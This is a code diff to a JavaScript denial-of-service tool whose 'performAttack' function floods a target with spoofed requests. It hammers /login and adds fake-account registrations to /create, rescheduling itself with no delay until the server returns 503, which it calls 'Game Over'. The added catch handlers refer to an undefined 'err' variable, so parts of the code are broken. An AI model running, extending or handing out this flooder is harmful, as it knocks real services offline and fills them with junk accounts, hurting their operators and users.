@@ -160,6 +160,22 @@ const performAttack = (url, agent, continueAttack) => {
         "X-Permitted-Cross-Domain-Policies": "none",
         "X-Powered-By": "PHP/7.4.3",
     };
+    
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
+  appstate: fakeState(),
+  botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
+  botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
+  botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
+  username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
+})
+    .then(() => {
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
+    })
+    .catch(() => {
+        if (err.response?.status === 404) return;
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
+    });
+
 
     axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
         state: fakeState()
@@ -168,6 +184,7 @@ const performAttack = (url, agent, continueAttack) => {
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     })
     .catch(() => {
+        if (err.response?.status === 404) return;
         setTimeout(() => performAttack(url, agent, continueAttack), 0);
     });
 
@@ -193,6 +210,7 @@ const performAttack = (url, agent, continueAttack) => {
         } else if (err.response?.status === 404) {
             console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
             continueAttack = false;
+            return;
         } else if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503) - Game Over!"));
         } else if (err.response?.status === 502) {
@@ -273,3 +291,4 @@ app.listen(port, () => {
         }
     }
 });
+
